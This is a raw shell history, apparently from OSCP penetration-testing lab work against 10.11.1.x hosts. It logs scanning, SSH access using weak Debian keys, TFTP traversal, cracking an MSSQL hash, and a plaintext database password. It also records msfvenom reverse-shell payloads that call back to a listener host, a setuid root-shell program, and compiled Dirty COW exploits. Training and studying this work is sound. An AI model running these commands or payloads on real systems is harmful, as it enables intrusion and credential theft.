 1597  2020-09-01 21:07  /home/kali/.cargo/bin/rg  --files f1fb2162a02f0f7c40c210e6167f05ca  ./
 1598  2020-09-01 21:09  f1fb2162a02f0f7c40c210e6167f05ca
 1599  2020-09-01 21:15  /home/kali/.cargo/bin/rg  --files pazdjoHxCGr2tjH16FVEvuwUTtHte8xK1EJ2nmWSHx4   ./
 1600  2020-09-01 21:15  /home/kali/.cargo/bin/rg  pazdjoHxCGr2tjH16FVEvuwUTtHte8xK1EJ2nmWSHx4   ./
 1601  2020-09-01 21:15  /home/kali/.cargo/bin/rg  919191e  ./
 1602  2020-09-01 21:16  locate ./ | grep 919191e 
 1603  2020-09-01 21:17  locate ./ | grep d974278125bb342c8817a46607c81956-20295.pub\n
 1604  2020-09-01 21:17  ssh-keygen -l -f authorized_keys 
 1605  2020-09-01 21:20  cat ./f1fb2162a02f0f7c40c210e6167f05ca-16858\n
 1606  2020-09-01 21:21  ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  root@10.11.1.136
 1607  2020-09-01 21:23  ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  root@targetmachine
 1608  2020-09-01 21:34  chmod 600  ./f1fb2162a02f0f7c40c210e6167f05ca-16858
 1609  2020-09-01 21:34  ls -al ./f1fb2162a02f0f7c40c210e6167f05ca-16858
 1610  2020-09-01 21:34  ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 
 1611  2020-09-01 21:35  ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  root@10.11.1.136 
 1612  2020-09-01 21:56  ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  root@10.11.1.136 -vv
 1613  2020-09-01 21:57  ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 -vv
 1614  2020-09-01 22:00  cd sda
 1615  2020-09-01 22:00  ssh -oHostKeyAlgorithms=+ssh-dss  -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 
 1616  2020-09-01 22:00  ssh -oHostKeyAlgorithms=+ssh-dss  -i f1fb2162a02f0f7c40c210e6167f05ca-16858  root@10.11.1.136 
 1617  2020-09-01 22:09  ssh -oHostKeyAlgorithms=+ssh-dss  -i f1fb2162a02f0f7c40c210e6167f05ca-16858  root@10.11.1.136 -vv
 1618  2020-09-01 22:09  ssh -oHostKeyAlgorithms=+ssh-dss  -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 -vv
 1619  2020-09-01 22:10  ssh -oHostKeyAlgorithms=+ssh-dss  -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 -v
 1620  2020-09-01 22:11  vim authorized_keys
 1621  2020-09-01 22:11  vim known_hosts
 1622  2020-09-01 22:15  ssh   -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136 -vl
 1623  2020-09-01 22:15  cd das
 1624  2020-09-01 22:20  cp ~/CTF_template-1.ctb ./
 1625  2020-09-01 22:20  cherrytree CTF_template-1.ctb
 1626  2020-09-01 22:22  ced authorized_keys
 1627  2020-09-01 22:50  cat known_hosts
 1628  2020-09-01 22:56  cat f1fb2162a02f0f7c40c210e6167f05ca-16858
 1629  2020-09-02 00:14  searchsploit priv
 1630  2020-09-02 00:14  searchsploit Privilege Escalation 
 1631  2020-09-02 00:20  touch scp.c
 1632  2020-09-02 00:20  gcc scp.c
 1633  2020-09-02 00:20  rm a.out
 1634  2020-09-02 00:20  rm a.out -o scp
 1635  2020-09-02 00:20  ./s
 1636  2020-09-02 00:21  vim scp.c
 1637  2020-09-02 00:21  su root
 1638  2020-09-02 00:21  rm scp
 1639  2020-09-02 00:21  vim scp.c 
 1640  2020-09-02 00:27  gcc scp.c -o scp
 1641  2020-09-02 00:27  ./scp
 1642  2020-09-02 02:27  rm CTF_template-1.ctb\~ CTF_template-1.ctb\~\~\~ CTF_template-1.ctb\~\~
 1643  2020-09-02 02:27  git clean
 1644  2020-09-02 02:27  git clear
 1645  2020-09-02 02:28  git rm --cached results/10.11.1.136/exploit/keys/debian-ssh\n
 1646  2020-09-02 02:28  git rm --cached -f results/10.11.1.136/exploit/keys/debian-ssh\n
 1647  2020-09-02 02:29  git reflog
 1648  2020-09-02 03:30  vim /etc/samba/smb.conf 
 1649  2020-09-02 03:49  searchsploit Symlink Directory Traversal 
 1650  2020-09-02 04:00  git clone https://github.com/g0tmi1k/debian-ssh.git
 1651  2020-09-02 04:02  ll;
 1652  2020-09-02 04:02  cd debian-ssh/
 1653  2020-09-02 04:03  bzip2 -d  debian_ssh_rsa_1024_x86.tar.bz2
 1654  2020-09-02 04:03  bzip2 -d  debian_ssh_dsa_1024_x86.tar.bz2
 1655  2020-09-02 04:03  tar -xvf debian_ssh_dsa_1024_x86.tar
 1656  2020-09-02 04:04  tree
 1657  2020-09-02 04:15  mv -r keys ~/
 1658  2020-09-02 04:15  mv  keys ~/
 1659  2020-09-02 04:21  cd ssh
 1660  2020-09-02 04:22  ssh-keygen -l -f authorized_keys -E md5
 1661  2020-09-02 04:24  cd common_keys
 1662  2020-09-02 04:24  cd dsa
 1663  2020-09-02 04:24  cd 1024
 1664  2020-09-02 04:24  find ./ | grep f1fb2162a02f0f7c40c210e6167f05ca
 1665  2020-09-02 05:28  git commit -m "finished suffer"
 1666  2020-09-02 05:29  nmap -sn 10.11.1.0/24\n
 1667  2020-09-02 05:29  autorecon  10.11.1.101
 1668  2020-09-02 05:30  autorecon  10.11.1.111\n
 1669  2020-09-02 06:18  cat _patterns.log\n
 1670  2020-09-02 06:20  curl 10.11.1.101/
 1671  2020-09-02 06:25  smbclient  //10.11.1.101/print -U ""\n
 1672  2020-09-02 06:28  klk
 1673  2020-09-02 06:33  curl http://10.11.1.101/index.html\#
 1674  2020-09-02 06:37  shh alfred@10.11.1.101
 1675  2020-09-02 06:37  ssh alfred@10.11.1.101
 1676  2020-09-02 06:38  cd reportt
 1677  2020-09-02 06:41  mv CTF_template.ctb report
 1678  2020-09-02 06:59  git clone https://github.com/rebootuser/LinEnum.git
 1679  2020-09-02 07:00  cp LinEnum.sh ~/OSCP/results/10.11.1.101/exploit
 1680  2020-09-02 07:00  cd ~/OSCP/results/10.11.1.101/exploit
 1681  2020-09-02 07:02  ssh alfred@10.11.1.101 -t "bash --noprofile"\n
 1682  2020-09-02 08:13  git commit -m "finished 101"
 1683  2020-09-02 19:08  _full_tcp_nmap.txt
 1684  2020-09-02 19:10  cat tcp_49664_rpc_nmap.txt
 1685  2020-09-02 19:12  cat tcp_8732_http_gobuster.txt
 1686  2020-09-02 19:12  cat tcp_8732_http_index.html
 1687  2020-09-02 19:12  cat tcp_5985_http_whatweb.txt
 1688  2020-09-02 19:12  tcp_8732_http_robots.txt
 1689  2020-09-02 19:12  cat tcp_8732_http_robots.txttcp_8732_http_robots.txt
 1690  2020-09-02 19:12  cat tcp_8732_http_robots.txt
 1691  2020-09-02 19:14  sudo  nmap -sU -p69 --script tftp-enum 10.11.1.111
 1692  2020-09-02 19:15  cherrytreer CTF_template.ctb
 1693  2020-09-02 19:18  tftp 
 1694  2020-09-02 19:23  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.217 LPORT=443 -f exe -o rshell.exe
 1695  2020-09-02 19:24  mv rshell.exe ../exploit
 1696  2020-09-02 19:29  nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt 10.11.1.111
 1697  2020-09-02 19:29  sudo nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=customlist.txt 10.11.1.111
 1698  2020-09-02 19:29  sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.11.1.111\n
 1699  2020-09-02 19:33  git clone https://github.com/sirMackk/py3tftp.git
 1700  2020-09-02 19:34  pip install py3tftp\n
 1701  2020-09-02 19:34  pip3 install --user py3tftp\n
 1702  2020-09-02 19:34  cd ~/OSCP/results/10.11.1.111/exploit
 1703  2020-09-02 19:36  py3tftp
 1704  2020-09-02 19:37  py3tftp 10.11.1.111 69
 1705  2020-09-02 19:38  locate / | grep 40138
 1706  2020-09-02 19:38  vim /usr/share/exploitdb/exploits/windows/remote/40138.py
 1707  2020-09-02 19:38  cp /usr/share/exploitdb/exploits/windows/remote/40138.py ./
 1708  2020-09-02 19:40  python3 40138.py
 1709  2020-09-02 19:40  vim 40138.py
 1710  2020-09-02 19:42  nc -lvp 4444
 1711  2020-09-02 19:42  python 40138.py
 1712  2020-09-02 19:44  tftp-hpa
 1713  2020-09-02 19:44  sudo apt install tftp-hpa
 1714  2020-09-02 19:46  vim /etc/inetd.conf
 1715  2020-09-02 19:55  mkdir 10.11.1.111
 1716  2020-09-02 19:55  git clone https://github.com/EnableSecurity/tftptheft.git
 1717  2020-09-02 19:55  cd tftptheft
 1718  2020-09-02 19:55  python finder.py
 1719  2020-09-02 19:56  python thief.py
 1720  2020-09-02 19:56  python thief.py 10.11.1.111
 1721  2020-09-02 19:56  python finder.py 10.11.1.111
 1722  2020-09-02 19:57  python finder.py 10.11.1.111 69
 1723  2020-09-02 19:58  python thief.py 10.11.1.111\n
 1724  2020-09-02 19:58  python thief.py 10.11.1.111:69\n
 1725  2020-09-02 19:58  python thief.py 10.11.1.111 69\n
 1726  2020-09-02 19:59  python thief.py -p6969 10.11.1.111 \n
 1727  2020-09-02 19:59  python thief.py -p69 10.11.1.111 \n
 1728  2020-09-02 20:00  cd auxiliary/scanner/tftp/tftpbrute
 1729  2020-09-02 20:00  locate / | grep  auxiliary/scanner/tftp/tftpbrute
 1730  2020-09-02 20:00  vim /usr/share/metasploit-framework/modules/auxiliary/scanner/tftp/tftpbrute.rb\n
 1731  2020-09-02 20:00  msf
 1732  2020-09-02 20:28  dotdotpwn 
 1733  2020-09-02 20:28  locate / | grep dotdotpwn 
 1734  2020-09-02 20:31  sudo apt install DotDotPwn 
 1735  2020-09-02 20:33  dotdotpwn
 1736  2020-09-02 20:36  dotdotpwn.pl
 1737  2020-09-02 20:36  locate / | grep dotdotpwn
 1738  2020-09-02 20:36  sudo dotdotpwn.pl
 1739  2020-09-02 20:39  sudo perl -MCPAN -e "install tftp"
 1740  2020-09-02 20:40  cpan 
 1741  2020-09-02 20:45  sudo cpan 
 1742  2020-09-02 21:42  sudo dotdotpwn.pl -o windows -e BAK -m tftp  -h 10.11.1.111
 1743  2020-09-02 21:44  sudo dotdotpwn.pl -o windows -f /MSSQL/BACKUPS/ -e BAK -m tftp  -h 10.11.1.111
 1744  2020-09-02 21:44  sudo dotdotpwn.pl -o windows -f /MSSQL/Backups/ -e BAK -m tftp  -h 10.11.1.111
 1745  2020-09-02 21:45  sudo dotdotpwn.pl -o windows -f /MSSQL/Backups/ -m tftp  -h 10.11.1.111
 1746  2020-09-02 21:45  sudo dotdotpwn.pl -o windows -f MSSQL/Backups/ -m tftp  -h 10.11.1.111
 1747  2020-09-02 21:51  sudo dotdotpwn.pl -o windows -f Program Files\Microsoft SQL Server\MSSQL.2\MSSQL -m tftp  -h 10.11.1.111
 1748  2020-09-02 21:51  sudo dotdotpwn.pl -o windows -f Program Files/Microsoft SQL Server/MSSQL.2/MSSQL -m tftp  -h 10.11.1.111
 1749  2020-09-02 21:51  sudo dotdotpwn.pl -o windows -f Program Files/MicrosoftSQLServer/MSSQL.2/MSSQL -m tftp  -h 10.11.1.111
 1750  2020-09-02 21:51  sudo dotdotpwn.pl -o windows -f ProgramFiles/MicrosoftSQLServer/MSSQL.2/MSSQL -m tftp  -h 10.11.1.111
 1751  2020-09-02 21:53  sudo dotdotpwn.pl -o windows -f ProgramFiles/MicrosoftSQLServer/MSSQL12.SQL2014/Backups -m tftp  -h 10.11.1.111
 1752  2020-09-02 21:54  sudo dotdotpwn.pl -o windows  Program Files-m tftp  -h 10.11.1.111
 1753  2020-09-02 21:54  sudo dotdotpwn.pl -o windows  ProgramFiles -m tftp  -h 10.11.1.111
 1754  2020-09-02 21:54  sudo dotdotpwn.pl -o windows  -f ProgramFiles -m tftp  -h 10.11.1.111
 1755  2020-09-02 21:59  sudo dotdotpwn.pl -o windows  -f Program~Files -m tftp  -h 10.11.1.111
 1756  2020-09-02 22:01  sudo dotdotpwn.pl -o windows -f \windows\ -m tftp  -h 10.11.1.111
 1757  2020-09-02 22:01  sudo dotdotpwn.pl -o windows -f windows\ -m tftp  -h 10.11.1.111
 1758  2020-09-02 22:01  sudo dotdotpwn.pl -o windows -f windows/ -m tftp  -h 10.11.1.111
 1759  2020-09-02 22:05  sudo dotdotpwn.pl -o windows -e bak -m tftp  -h 10.11.1.111
 1760  2020-09-02 22:06  sudo dotdotpwn.pl -o program files -m tftp  -h 10.11.1.111
 1761  2020-09-02 22:07  sudo dotdotpwn.pl -o program~files -m tftp  -h 10.11.1.111
 1762  2020-09-02 22:07  sudo dotdotpwn.pl -o programfiles -m tftp  -h 10.11.1.111
 1763  2020-09-02 22:20  sudo dotdotpwn.pl  -m tftp  -h 10.11.1.111
 1764  2020-09-02 22:32  sudo dotdotpwn.pl -O  -m tftp  -h 10.11.1.111
 1765  2020-09-03 00:23  locate / | grep autore
 1766  2020-09-03 00:30  cat tcp_1433_mssql_nmap.txt
 1767  2020-09-03 04:26  sudo python -m SimpleHTTPServer 5000
 1768  2020-09-03 05:21  sudo dotdotpwn.pl -O windows  -m tftp  -h 10.11.1.111
 1769  2020-09-03 05:21  sudo dotdotpwn.pl -o windows  -m tftp  -h 10.11.1.111
 1770  2020-09-03 05:22  vim Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf'
 1771  2020-09-03 05:22  c OSCP
 1772  2020-09-03 05:24  vim Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
 1773  2020-09-03 05:24  rm Server\MSSQL14.SQLEXPRESS\MSSQL\DATA\master.mdf
 1774  2020-09-03 05:24  rm Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf
 1775  2020-09-03 07:43  which tftp
 1776  2020-09-03 07:43  sudo apt update tftp
 1777  2020-09-03 07:44  pip3 install --user pip install tftpy
 1778  2020-09-03 07:54  touch tftpclient.py
 1779  2020-09-03 07:54  ./tftpclient.py
 1780  2020-09-03 07:55  sudo ./tftpclient.py
 1781  2020-09-03 07:55  pip3 install --user .TftpShared
 1782  2020-09-03 07:55  pip3 install --user TftpShared
 1783  2020-09-03 07:55  pip3 install --user tftpshared
 1784  2020-09-03 07:55  vim tftpclient.py
 1785  2020-09-03 07:56  python tftpclient.py
 1786  2020-09-03 07:58  touch download.py
 1787  2020-09-03 07:58  chmod +x download.py
 1788  2020-09-03 07:58  chmod +x tft
 1789  2020-09-03 07:58  chmod +x tftpclient.py
 1790  2020-09-03 07:58  python3 tftpclient.py
 1791  2020-09-03 08:00  ./download.py
 1792  2020-09-03 08:00  python3 download.py
 1793  2020-09-03 08:00  pip3 install --user tftpy
 1794  2020-09-03 08:01  vim download.py
 1795  2020-09-03 19:15  sqsh -S 10.11.1.31 -U sa -P "poiuytrewq"
 1796  2020-09-03 20:25  rm \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\TEMPLA\~1\\master.mdf
 1797  2020-09-03 20:26  rm \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master rm Files\\Microsoft FilesMicrosoftSQLServer\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf Files\\Microsoft\\\\ \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\mastlog.ldf \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\templog.ldf
 1798  2020-09-03 20:28  rm \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\Install\\msdb110_upgrade.sql \"Program \"\\Program \"Program\\ \"Program\\\\ \\Program Program Program\\\\\\ \\Program\\ Program\\ Program%20Files\\Microsoft \\Program%20Files\\Microsoft%20SQL%20Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA \\Program%20Files\\Microsoft%20SQL%20Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf Program\~Files ProgramFiles\\MicrosoftSQLServer\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf \\Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf SQL\\\\ Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf \\SQL Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA \\Users\\Administrator\\Desktop\\Proof.txt
 1799  2020-09-03 20:28  vim '\PROGRA~1\MICROS~1\MSSQL14.SQLEXPRESS\MSSQL\TEMPLA~1\mastlog.ldf'
 1800  2020-09-03 20:30  autorecon  10.11.1.237
 1801  2020-09-03 20:49  rm SQL password.mdf Backups DATA
 1802  2020-09-03 20:49  find / | grep master.mdf
 1803  2020-09-03 21:41  atftp
 1804  2020-09-03 21:41  atftp 10.11.1.111\n
 1805  2020-09-03 21:53  rm hosts
 1806  2020-09-03 21:53  rm \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\Backups\\master.mdf \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\Backups\\MSSQL\\Data\\master.mdf \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\TEMPLA\~1\\ \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\TEMPLA\~1\\master.mdf \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\TEMPLA\~1\\mastlog.ldf \\PROGRA\~1\\MICROS\~1\\MSSQL14.SQLEXPRESS\\MSSQL\\Binn\\Templates\\master.mdf \\Program\\\\Files\\Microsoft\\\\SQL\\\\Server\\MSSQL14.SQLEXPRESS\\MSSQL\\DATA\\master.mdf
 1807  2020-09-03 22:30  vim master.mdf
 1808  2020-09-04 00:45  strings masterbinary.mdf
 1809  2020-09-04 00:46  strings master.mdf
 1810  2020-09-04 04:25  cat tcp_49153_rpc_nmap.txt
 1811  2020-09-04 04:59  touch sa_pass.txt
 1812  2020-09-04 05:04  hashid sa_pass.txt
 1813  2020-09-04 05:04  cat sa_pass.txt
 1814  2020-09-04 05:05  hashid 0x0200318835DF285D7508DB55BFABEF7B373E27D3ABDEADF953C3035F45237D08A00B1DFFB3A936128BB508B9D799777526F11BE65AB12F9D2A453FE18989D75F91369E0E4288
 1815  2020-09-04 05:06  /usr/sbin/john --format=mssql --rules -w=/usr/share/wordlists/rockyou.txt nativehashalice.txt
 1816  2020-09-04 05:23  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt sa_pass.txt
 1817  2020-09-04 05:24  sqsh -S 10.11.1.31 -U sa -P "sqls3rv3r"
 1818  2020-09-04 05:26  sqsh -S 10.11.1.111 -U sa -P "sqls3rv3r"
 1819  2020-09-04 05:30  nc -lvp 1234
 1820  2020-09-04 06:00  git commit -m "finished tftp "
 1821  2020-09-04 08:45  vim tcp_80_http_index.html
 1822  2020-09-04 08:48  cat _patterns.log
 1823  2020-09-04 08:49  cat tcp_443_sslscan.txt
 1824  2020-09-04 08:49  ccd report
 1825  2020-09-04 08:52  sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.11.1.237
 1826  2020-09-04 08:53  sudo nmap -sTU --top-ports  10.11.1.237
 1827  2020-09-04 08:54  sudo nmap -sTU --top-ports 1000  10.11.1.237
 1828  2020-09-04 09:01  vim tcp_`\n
 1829  2020-09-04 09:02  vim tcp_111_nfs_nmap.txt\n
 1830  2020-09-04 09:02  vim tcp_111_showmount.txt
 1831  2020-09-04 09:08  locate / | grep linux/remote/24947.txt
 1832  2020-09-04 09:08  vim /usr/share/exploitdb/exploits/linux/remote/24947.txt
 1833  2020-09-04 20:28  $ sudo apt install mingw-w64
 1834  2020-09-04 20:54  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 CMD=/bin/bash -f js_le -e generic/none\n
 1835  2020-09-04 22:16  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
 1836  2020-09-04 23:14  i a
 1837  2020-09-04 23:22  autorecon  10.11.1.133
 1838  2020-09-04 23:44  msfvenom -p  -p linux/x86/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f js_le -e generic/none
 1839  2020-09-05 00:06  searchsploit mongo 2.2.3
 1840  2020-09-05 00:44  shadowmount
 1841  2020-09-05 01:00  sudo apt install nfs-common
 1842  2020-09-05 01:01  sudo apt install cifs-utils
 1843  2020-09-05 01:01  print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > ./suid.c   \n
 1844  2020-09-05 01:04  shadowmount -e 10.11.1.237
 1845  2020-09-05 01:05  showmount -e 10.11.1.237
 1846  2020-09-05 01:05  sudo apt install showmount
 1847  2020-09-05 01:05  apt-cache search showmount\n
 1848  2020-09-05 01:06  locate / | grep showmount
 1849  2020-09-05 01:06  /usr/sbin/showmount
 1850  2020-09-05 01:06  /usr/sbin/showmount -e 10.11.1.237
 1851  2020-09-05 01:38  hashid $apr1$GDBY7mKy$otQYfmnQX8zRGXW96Y6ff0
 1852  2020-09-05 01:39  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt $apr1$GDBY7mKy$otQYfmnQX8zRGXW96Y6ff0
 1853  2020-09-05 01:45  git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
 1854  2020-09-05 01:49  cd results/10.11.1.237
 1855  2020-09-05 02:03  cherrytree ../../10.11.1.111
 1856  2020-09-05 02:04  cherrytree ../../10.11.1.111/report/insider.ctb
 1857  2020-09-05 02:32  cat ~/.ssh/config 
 1858  2020-09-05 03:06  searchsploit 28806
 1859  2020-09-05 03:06  locate / | grep linux/local/28806.txt
 1860  2020-09-05 03:06  vim /usr/share/exploitdb/exploits/linux/local/28806.txt
 1861  2020-09-05 03:07  cp /usr/share/exploitdb/exploits/linux/local/28806.txt ./
 1862  2020-09-05 03:07  mv 28806.txt ../../10.11.1.237/exploit
 1863  2020-09-05 03:27  ssh davtest@10.11.1.237 
 1864  2020-09-05 04:13  cp /usr/share/exploitdb/exploits/linux/local/40616.c ./
 1865  2020-09-05 04:13  rm suid.c
 1866  2020-09-05 04:15  locate / | grep linux/local/40839.c
 1867  2020-09-05 04:15  /usr/share/exploitdb/exploits/linux/local/40839.c
 1868  2020-09-05 04:19  gcc /usr/share/exploitdb/exploits/linux/local/40839.c -o 
 1869  2020-09-05 04:19  gcc /usr/share/exploitdb/exploits/linux/local/40839.c -o lol
 1870  2020-09-05 04:20  vim 40616.c
 1871  2020-09-05 04:21  gcc 40616.c -o cowroot -pthread
 1872  2020-09-05 04:24  locate / | grep linux/local/40616.c
 1873  2020-09-05 04:24  locate / | grep linux/local/40838.c
 1874  2020-09-05 04:25  vim /usr/share/exploitdb/exploits/linux/local/40838.c
 1875  2020-09-05 04:25  cp /usr/share/exploitdb/exploits/linux/local/40838.c ./
 1876  2020-09-05 04:25  vim 40838.c
 1877  2020-09-05 04:25  gcc -pthread 40838.c -o d
 1878  2020-09-05 04:27  gcc -pthread 40838.c -o fuck
 1879  2020-09-05 04:41  searchsploit dirty cow
 1880  2020-09-05 04:42  vim linux/local/40839.c
 1881  2020-09-05 04:42  vim 40839.c
 1882  2020-09-05 04:42  gcc -pthread 40839.c -o dirty -lcrypt
 1883  2020-09-05 21:58  hashid $apr1$r81PBjqu$/h5cozwj/TwTK7O3Du1Vb0\n
 1884  2020-09-05 23:33  chmod +x /home/dave/rootprog
 1885  2020-09-06 02:30  /usr/sbin/john --rules -w=/usr/share/wordlists/rockyou.txt sa_pass.txtip a
 1886  2020-09-06 02:52  git commit -m "finshed humble"
 1887  2020-09-06 06:39  cherrytree humble.ctb\n
 1888  2020-09-06 06:41  cat tcp_443_https_gobuster.txt\n
 1889  2020-09-06 08:05  sudo nmap -sTU --top-ports 1000  10.11.1.133
 1890  2020-09-06 08:10  cur lhttp://10.11.1.133/
 1891  2020-09-06 08:10  curl http://10.11.1.133/
 1892  2020-09-06 08:11  curl http://10.11.1.133/error
 1893  2020-09-06 08:54  curl http://10.11.1.133/iissamples/exair/howitworks/Code.asp
 1894  2020-09-06 08:54  curl http://10.11.1.133/iissamples/issamples/codebrws.asp
 1895  2020-09-06 09:01  gobuster dir -u http://10.11.1.133:80/_vti_bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.133/scans/tcp_80_http_gobuster_dirbuster.txt"
 1896  2020-09-06 09:03  # gobuster dir -u http://10.11.1.133:80/_vti_bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.133/scans/tcp_80_http_gobuster_dirbuster.txt"\n
 1897  2020-09-06 09:03  gobuster dir -u http://10.11.1.133:80/_vti_cnf/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.133/scans/tcp_80_http_gobuster_dirbuster.txt"\n
 1898  2020-09-06 09:04  gobuster dir -u http://10.11.1.133:80/_vti_pvt/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.133/scans/tcp_80_http_gobuster_dirbuster.txt"\n
 1899  2020-09-06 09:05  gobuster dir -u http://10.11.1.133:80/_vti_txt/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o "/home/kali/OSCP/results/10.11.1.133/scans/tcp_80_http_gobuster_dirbuster.txt"\n
 1900  2020-09-06 09:16  curl http://10.11.1.133/test.asp
 1901  2020-09-06 09:30  curl http://10.11.1.133/iissamples/
 1902  2020-09-06 09:32  curl http://10.11.1.133/check.php
 1903  2020-09-06 10:00  curl http://10.11.1.133/test.asp test
 1904  2020-09-06 10:04  ssls
 1905  2020-09-06 10:04  curl http://10.11.1.133/hidd3n-script  -o test
 1906  2020-09-06 10:04  cat test
 1907  2020-09-06 10:04  strings test
 1908  2020-09-06 10:10  s\t
 1909  2020-09-06 20:18  autorecon  10.11.1.227
 1910  2020-09-06 21:23  git clone https://github.com/mindedsecurity/JStillery\n
 1911  2020-09-06 21:23  cd JStillery
 1912  2020-09-06 21:23  cd JStillery\n
 1913  2020-09-06 21:25  locate /  grep npm
 1914  2020-09-06 21:26  locate / | grep npm
 1915  2020-09-06 21:26  npm install
 1916  2020-09-06 21:26  sudo apt-get install nodejs
 1917  2020-09-06 21:27  node -v
 1918  2020-09-06 21:27  node
 1919  2020-09-06 21:27  npm -v
 1920  2020-09-06 21:27  sudo apt install npm
 1921  2020-09-06 21:35  npm
 1922  2020-09-06 21:36  sudo npm install
 1923  2020-09-07 00:01  touch ls.txt
 1924  2020-09-07 00:01  echo ls >> ls.txt
 1925  2020-09-07 00:01  echo ls -al > ls.txt
 1926  2020-09-07 00:01  cat ls.txt
 1927  2020-09-07 00:12  vim ls.txt
 1928  2020-09-07 00:14  touch ls
 1929  2020-09-07 00:14  echo ls -al > ls
 1930  2020-09-07 00:32  touch lmao.txt
 1931  2020-09-07 00:36  touch lmao.txtheader.inc.php
 1932  2020-09-07 01:16  curl http://10.11.1.133/test.asp -o test
 1933  2020-09-07 01:16  curl http://10.11.1.133/test.asp 
 1934  2020-09-07 02:01  cat lmao.txt
 1935  2020-09-07 02:01  cat lmao.txtheader.inc.php
 1936  2020-09-07 02:25  cherrytree suffer.ctb~
 1937  2020-09-07 02:26  cherrytree suffer.ctb
 1938  2020-09-07 02:33  cp shell.php ../../results/10.11.1.133
 1939  2020-09-07 02:33  mv shell.php exploit
 1940  2020-09-07 02:35  cat phpcmd.php
 1941  2020-09-07 02:36  vim lmao.txtheader.inc.php
 1942  2020-09-07 03:13  vim shell.txtheader.inc.php
 1943  2020-09-07 03:16  vim shell.php\n
 1944  2020-09-07 07:05  cd psc
 1945  2020-09-07 08:33  stty -a
 1946  2020-09-07 09:20  git commit -m "finished  gh0st"
 1947  2020-09-07 18:56  cd 10.11.1.79
 1948  2020-09-07 18:58  sudo nmap -sTU --top-ports 1000  10.11.1.79
 1949  2020-09-07 19:03  nmap -p 2233 10.11.1.1-255
 1950  2020-09-07 19:09  autorecon  10.11.1.222
 1951  2020-09-07 19:17  cd ^[[200~10.11.1.136~
 1952  2020-09-07 19:18  cd looot
 1953  2020-09-07 19:19  cherrytree suffer.ctb~~~
 1954  2020-09-07 19:29  cd ~/OSCP/results/10.11.1.136 
 1955  2020-09-07 19:33  smbclient  //10.11.1.136/"Bob Share" -U ""\n
 1956  2020-09-07 19:35  cat authorized_keys
 1957  2020-09-07 19:40  find  ./ | grep d974278125bb342c8817a46607c81956-20295.pub\n
 1958  2020-09-07 19:40  find  / | grep d974278125bb342c8817a46607c81956-20295.pub\n
 1959  2020-09-07 19:41  cd /home/kali/debian-ssh/common_keys/dsa/1024/
